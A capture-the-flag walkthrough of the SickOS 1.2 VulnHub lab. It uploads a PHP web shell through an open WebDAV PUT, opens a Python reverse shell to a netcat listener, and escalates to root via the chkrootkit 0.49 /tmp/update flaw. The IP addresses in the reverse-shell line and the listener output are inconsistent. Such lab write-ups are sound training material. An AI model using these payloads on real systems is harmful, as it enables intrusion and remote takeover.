# SickOS: 1.2 Walkthrough

![]()

---

If you're interested to try it out, more details here: [https://www.vulnhub.com/entry/sickos-12,144/](https://www.vulnhub.com/entry/sickos-12,144/)

> Name........: SickOs1.2  
> Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
>
> This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.

---

# Stage 1: Reconnaissance

Tools used:
* nmap
* curl

First of all, obligatory network scan:

```
root@kali:~# nmap -n -sV 192.168.1.100 -T4

Starting Nmap 7.40 ( https://nmap.org ) at xxxx-xx-xx xx:xx EDT
Nmap scan report for 192.168.1.100
Host is up (0.00038s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
MAC Address: 08:00:27:B3:DD:CB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds

root@kali:~# curl 192.168.1.100
<html>

<img src="blow.jpg">

</html>

// output truncated

<!-- NOTHING IN HERE ///\\\ -->>>>
```

---

# Stage 2: Enumeration

Tools used:
* dirb
* curl

When I did a `dirb http://192.168.1.100`, this is what I got:

```
root@kali:~# dirb http://192.168.1.100

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: xxx xxx xx xx:xx:xx xxxx
URL_BASE: http://192.168.1.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.100/ ----
+ http://192.168.1.100/index.php (CODE:200|SIZE:163)                                                                                               
==> DIRECTORY: http://192.168.1.100/test/                                                                                                          
                                                                                                                                                    
---- Entering directory: http://192.168.1.100/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: xxx xxx xx xx:xx:xx xxxx
DOWNLOADED: 4612 - FOUND: 1

```

---

# Stage 3: Exploitation

Tools used:
* curl
* netcat

Tried nikto but it didn't give anything useful. However, `/test` being there, empty and listable bugged me for a while, so I decide to find out if I am able to somehow gain access by uploading a shell there:

```
root@kali:~# curl -X OPTIONS 192.168.1.100/test/ -v
*   Trying 192.168.1.100...
* TCP_NODELAY set
* Connected to 192.168.1.100 (192.168.1.100) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.1.100
> User-Agent: curl/7.57.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Wed, 10 Jan 2018 13:46:14 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.1.100 left intact

root@kali:~# curl -X PUT 192.168.1.100/test/foo.php -d "<?php echo vulnerable; ?>"
root@kali:~# curl 192.168.1.100/test/foo.php
vulnerable
```

Turns out, my suspicion was right! `/test` has HTTP PUT enabled with writable access! My simple echo script is able to execute. This means we can upload an entire shell there! Let's upload a rudimentary command shell:

```
root@kali:~# curl -X PUT 192.168.1.100/test/shell.php -d '<?php "<pre>".system($_GET["cmd"])."</pre>"; ?>'

root@kali:~# curl 192.168.1.100/test/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

With that, we can upgrade to a limited shell. Referring to my trusted [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I pick one of the commands to give me my reverse shell:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Except that it did not work.. After some searching around, I found out that some ports like 4444 and 1234 were blocked (possibly through `iptables`). I had to use port 443 as it is a well-known port used for HTTPS. Whatever, let's get on with it shall we?

```
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.101] from (UNKNOWN) [192.168.1.100] 35413
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"

www-data@ubuntu:/var$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
```

Similar to SickOS: 1.1, only `root` and a standard user has bash shells. Unfortunately, this time there isn't any config files for us to infer our passwords from. The firewall also seems to block egress connections, which made downloading additional scripts quite troubling. However, further searching revealed that `chkrootkit` is available on the system, and the version is vulnerable to a privilege escalation!

```
www-data@ubuntu:/var/www/test$ chkrootkit -V
chkrootkit version 0.49
```

The vulnerability occurs in the slapper() function where it reads and executes `/tmp/update` with root privileges, so we can put our python reverse shell code in that file and wait for cron to kick in.

```
// after a couple of minutes of waiting...

root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.12] from (UNKNOWN) [192.168.100.15] 48514
/bin/sh: 0: can't access tty; job control turned off
# ls /root
304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
chkrootkit-0.49
newRule
# cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
# cat newRule
# Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016
*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT
-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
COMMIT
# Completed on Mon Apr 25 22:48:24 2016
# 
```

Challenge completed! In hindsight, looking at the `/root/newRule` file reveals only ports 22, 80, 8080, and 443 were allowed to enter.

---

# Lessons Learnt

* Did not expect the occurrence of egress blocking capabilities, just because I had not encountered one of those in my practice for some time
* `chkrootkit` was an unexpected vector of privilege escalation (similar to `nmap --interactive`), therefore I have to keep up to date with various forms of non kernel privilege escalation techniques
* On another note, cronjobs are often ignored due to it being hard to manipulate by the attacker, yet many tasks are ran with `root` privileges. In the event of a cronjob calling a vulnerable program or service, such as this case with `chkrootkit`, it is truly a free golden ticket to the chocolate factory if you manage to spot it